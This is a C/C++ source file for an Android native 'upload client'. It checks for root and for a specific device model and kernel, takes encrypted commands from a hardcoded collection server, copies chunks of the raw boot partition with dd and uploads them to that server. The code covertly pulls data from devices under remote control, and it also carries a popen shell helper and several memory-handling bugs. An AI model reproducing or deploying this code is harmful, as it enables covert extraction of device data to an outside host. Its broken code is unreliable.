#define UPLOAD_CLIENT
#define RELEASE
#define OFFSET 9520
#include "curl/curl.h"
#include "md5.h"
#include "aes.h"
#include "info.h"
#include "detector.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/utsname.h>
#include <string.h>
#include <malloc.h>
#include <dirent.h>
#include <stdint.h>
#include <sys/system_properties.h>
#include <jni.h>
#define URL "http://192.168.42.56:8080/collect"
static char boot_path[256];
static uint8_t key[16];
char cookie [30];
long get_file_size(char *filename) {
	FILE* file;
	long curpos, length;
	if ((file = fopen(filename, "rb")) == NULL)
		return -1;
	curpos = ftell(file);
	fseek(file, 0L, SEEK_END);
	length = ftell(file);
	fseek(file, curpos, SEEK_SET);
	fclose(file);
	return length;
}
char *interactive_shell(const char* command) {
	FILE *fd;
	char *tmp = new char[256];
	char *result = new char[256];
	fd = popen(command, "r");
	if (fd == NULL) {
		exit(1);
	}
	while (fgets(tmp, sizeof(tmp), fd) != NULL) {
		strcat(result, tmp);
	}
	free(tmp);
	return result;
}
struct MemoryStruct {
	size_t size;
	char *memory;
};
void print_cookies(CURL *curl)
{
  CURLcode res;
  struct curl_slist *cookies;
  struct curl_slist *nc;
  int i;
#ifdef DEBUG
  printf("Cookies, curl knows:\n");
#endif
  res = curl_easy_getinfo(curl, CURLINFO_COOKIELIST, &cookies);
  if(res != CURLE_OK) {
#ifdef DEBUG
    fprintf(stderr, "Curl curl_easy_getinfo failed: %s\n",
            curl_easy_strerror(res));
#endif
    exit(1);
  }
  nc = cookies, i = 1;
  while(nc) {
    printf("[%d]: %s\n", i, nc->data);
    nc = nc->next;
    i++;
  }
  if(i == 1) {
    printf("(none)\n");
  }
  curl_slist_free_all(cookies);
}
void set_cookie(CURL* curl){
    curl_easy_setopt(curl, CURLOPT_COOKIE, cookie);
}

void set_session(CURL* curl) {
	curl_easy_setopt(curl, CURLOPT_COOKIE, session);
}
size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp) {
	size_t realsize = size * nmemb;
	struct MemoryStruct *mem = (struct MemoryStruct *) userp;

	mem->memory = (char*) realloc(mem->memory, mem->size + realsize + 1);
	if (mem->memory == NULL) {
		/* out of memory! */
#ifdef DEBUG
		printf("not enough memory (realloc returned NULL)\n");
#endif
		return 0;
	}
	memcpy(&(mem->memory[mem->size]), buffer, realsize);
	mem->size += realsize;
	mem->memory[mem->size] = 0;
	return realsize;
}
char* char2hex(char* str, size_t length) {
	char *out = (char*)malloc(length*2);
	for (int i = 0; i < length; i++){
		sprintf(out+2*i, "%.2x", str[i]);
	}
	return out;
}
char* hex2char(char* hex, size_t length) {
    if (length%2 != 0)
        return NULL;
    int j=0;
    char *out = (char*)malloc(length/2);
    for (int i = 0;i<length;i=i+2){
        sscanf((hex+i),"%2x",(out+j));
        j++;
    }
    return out;
}
void find_boot_file(const char* path) {
	DIR *d;
	struct dirent *dir;
	d = opendir(path);
	if (d) {
		while ((dir = readdir(d)) != NULL) {
			if (strcmp(dir->d_name, ".") != 0
					&& strcmp(dir->d_name, "..") != 0) {
				char* tmp = new char[256];
				memset(tmp, 0, sizeof(tmp));
				strcat(tmp, path);
				if (tmp[strlen(tmp) - 1] != '/')
					strcat(tmp, "/");
				strcat(tmp, dir->d_name);
				if (strstr(tmp, "by-name/boot") != NULL) {
					sprintf(boot_path, "%s\n", tmp);
				}
				find_boot_file(tmp);
				free(tmp);
			}
		}
		closedir(d);
	}
}
int get_boot_path() {
	memset(boot_path, 0, sizeof(boot_path));
	find_boot_file("/dev/block/platform/");
	if (strlen(boot_path)) {
		strtok(boot_path, "\n");
		return 1;
	}
	return -1;
}
static void phex(uint8_t* str) {
	unsigned char i;
	for (i = 0; i < 16; ++i)
		printf("%.2x", str[i]);
	printf("\n");
}
uint8_t* get_key(unsigned char* index) {
	memset(key, 0, sizeof(key));
	if (index == NULL || sizeof(index) > 16)
		return NULL;
	for (int i = 0; i < 16; i++) {
		key[i] = map[(int) *(index + i)];
	}
	return key;
}
char* decrypt_message(char* buf, uint32_t length, unsigned char* index) {
	char* cache = new char[length];
	memset(cache, 0, sizeof(cache));
	get_key(index);
	if (strlen((char*) key) == 0 || buf == NULL)
		return NULL;
	AES128_CBC_decrypt_buffer((uint8_t *) cache, (uint8_t*) buf, length, key,
			iv);
	return cache;
}
char* encrypt_message(char* buf, uint32_t length, unsigned char* index) {
	char* cache = new char[length];
	memset(cache, 0, sizeof(cache));
	get_key(index);
	if (strlen((char*) key) == 0 || buf == NULL)
		return NULL;
	AES128_CBC_encrypt_buffer((uint8_t *) cache, (uint8_t*) buf, length, key,
			iv);
	return cache;
}
char* get_model() {
	char *value = new char[32];
	__system_property_get("ro.product.model", value);
	return value;
}
int post_file(char* url, const char* file_path) {
	CURL *easyhandle;
	CURLcode res;
	curl_global_init(CURL_GLOBAL_ALL);
	struct curl_httppost *formpost = NULL;
	struct curl_httppost *lastptr = NULL;
	static const char buf[] = "Expect:";
	struct curl_slist *headerlist = NULL;
	easyhandle = curl_easy_init();
#ifdef DEBUG
	printf("trying upload binary data...\n");
	curl_easy_setopt(easyhandle, CURLOPT_VERBOSE, 1L);
#endif
	headerlist = curl_slist_append(headerlist, buf);
	curl_formadd(&formpost, &lastptr, CURLFORM_COPYNAME, "file", CURLFORM_FILE,
			file_path, CURLFORM_END);
	set_cookie(easyhandle);
	curl_easy_setopt(easyhandle, CURLOPT_URL, url);
	curl_easy_setopt(easyhandle, CURLOPT_USERAGENT,
			"29bd7da7271b5515f402128c8f5c5377");
	curl_easy_setopt(easyhandle, CURLOPT_HTTPPOST, formpost);
	curl_easy_setopt(easyhandle, CURLOPT_HTTPHEADER, headerlist);
	res = curl_easy_perform(easyhandle);
	if (res != CURLE_OK) {
		fprintf((FILE*) stderr, "curl_easy_perform() failed: %s\n",
				curl_easy_strerror(res));
		return 0;
	}

	curl_formfree(formpost);
	curl_slist_free_all(headerlist);
	curl_easy_cleanup(easyhandle);
	return 1;
}

char* post_data(char* url, char* data) {
	char* ciphertext;
	char* post_data;
	struct MemoryStruct chunk;
	chunk.memory = (char*) malloc(1); /* will be grown as needed by the realloc above */
	chunk.size = 0; /* no data at this point */
	CURL *easyhandle;
	CURLcode res;
	int cipher_length=strlen(data)+16-strlen(data)%16;
	ciphertext = encrypt_message((char*) data, strlen(data), key_index);
	curl_global_init(CURL_GLOBAL_ALL);
	easyhandle = curl_easy_init();
#ifdef DEBUG
	printf("try encrypt...\n");
//	curl_easy_setopt(easyhandle, CURLOPT_VERBOSE, 1L);
	phex((uint8_t*) ciphertext);
#endif
	post_data = (char*)malloc(cipher_length*2+5);
	sprintf(post_data,"data=%s",char2hex(ciphertext,cipher_length));
	set_session(easyhandle);
#ifdef DEBUG
	printf("post_data ----------- %s\n",post_data);
#endif
	curl_easy_setopt(easyhandle, CURLOPT_URL, url);
	curl_easy_setopt(easyhandle, CURLOPT_WRITEFUNCTION, write_data);
	curl_easy_setopt(easyhandle, CURLOPT_WRITEDATA, (void * )&chunk);
	curl_easy_setopt(easyhandle, CURLOPT_POSTFIELDSIZE, strlen(post_data));
	curl_easy_setopt(easyhandle, CURLOPT_POSTFIELDS, post_data);
	curl_easy_setopt(easyhandle, CURLOPT_USERAGENT,
			"29bd7da7271b5515f402128c8f5c5377");
	res = curl_easy_perform(easyhandle);
	if (res != CURLE_OK) {
		fprintf((FILE*) stderr, "curl_easy_perform() failed: %s\n",
				curl_easy_strerror(res));
		return NULL;
	} else {
#ifdef DEBUG
        print_cookies(easyhandle);
		printf("%lu bytes retrieved\n", (long) chunk.size);
		printf("Content\n%s\n", chunk.memory);
#endif
		curl_easy_cleanup(easyhandle);
		return chunk.memory;
	}
}


void get_md5(char* file_path, char output[33]) {
	unsigned char digest[16];
	MD5File(boot_path, digest);
	memset(output, 0, sizeof(output));
	for (int i = 0; i < 16; ++i)
		snprintf(&output[i * 2], 4,"%02x", (unsigned int) digest[i]);
}


int upload_main() {
	FILE *fd;
	uint32_t file_size;
	char md5string[33];
	struct utsname uts;
	char cmd[64];
	char input[16];
	char output[256];
	char *response;
	char *current;
	unsigned int count;

	if (getuid() != 0) {
#ifdef DEBUG
		printf("not root! \n");
#endif
		return NOT_ROOT;
	}
	uname(&uts);
	if ((strcmp(target.release, uts.release)
			| strcmp(target.version, uts.version)
			| strcmp(target.machine, uts.machine)
			| strcmp(target.model, get_model())) != 0) {
#ifdef DEBUG
		printf("incompatible target\n");
#endif
		return TARGET_ERROR;
	}
//  start networking...
	memset(output, 0, sizeof(output));
	snprintf(output,29, "id=%s", target.id);

	if ((response = post_data(URL, output))
			== NULL) {
#ifdef DEBUG
		printf("error on post!");
#endif
		return NET_ERROR;
	}


	//		DECRYPT
		char* text;
		char* cipher;
		int length = strlen(response);
		if ((cipher=hex2char(response,length))!=NULL)
		text = decrypt_message(cipher,length/2, key_index);
		else{
#ifdef DEBUG
		printf("decrypt error!\n");
#endif
		return DECRYPT_ERROR;
		}
#ifdef DEBUG
	printf("try decrypt response ...\n message is %s\n length is %d", text,length);
#endif
	if (strncmp(text, "boot_info", 9) == 0) {
		if (get_boot_path()) {
			if ((file_size = get_file_size(boot_path)) <= 0)
				return -1;
			get_md5(boot_path, md5string);
			memset(output, 0, sizeof(output));
			snprintf(output, 80,"id=%s&size=%u&md5=%s", target.id, file_size,
					md5string);
			if ((response = post_data(URL,
					output)) == NULL) {
#ifdef DEBUG
				printf("error on post!");
#endif
				return NET_ERROR;
			}
		}
	}
char* search = "&";
char* first_arg;
char* second_arg;
	if (strncmp(text, "boot_skip=", 10) == 0) {
	if ((first_arg=strtok(text, search))!=NULL){
			sscanf(first_arg + 10, "%d", &count);
			if (count > 1050) {
#ifdef DEBUG
				printf("invalid count!");
#endif
				return COUNT_ERROR;
			}
			if ((second_arg=strtok(NULL, search))!=NULL){
                if ((strncmp(second_arg, "cookie=", 7) == 0)&&(strlen(second_arg+7)==24)){
                strcat(cookie,"key=");
                sscanf(second_arg+7,"%s",&cookie[4]);
                    if (get_boot_path()) {
				        snprintf(cmd, 60 + strlen(boot_path),
				        		"dd if=%s of=/data/local/tmp/temp bs=32*1024 count=1 skip=%d",
				        		boot_path, count);
#ifdef DEBUG
				        printf("exec cmd %s\n", cmd);
#endif
				        system(cmd);
				        post_file(URL,
				        		"/data/local/tmp/temp");
				        system("rm /data/local/tmp/temp");
#ifdef DEBUG
				        printf("Upload Done !\n");
#endif
			        }
                }
			}
		}
	}
	return ALL_RIGHT;
#ifdef DEBUG
	printf("Done !\n");
#endif
}
int main(){
upload_main();
}
/*
jint JNICALL JNI_FUNCTION(jmain)(JNIEnv *env,jclass this){
	return upload_main()+OFFSET;
}

void JNICALL JNI_FUNCTION(junmain)(JNIEnv *env, jclass this, jclass clazz)
{
	return;
}*/

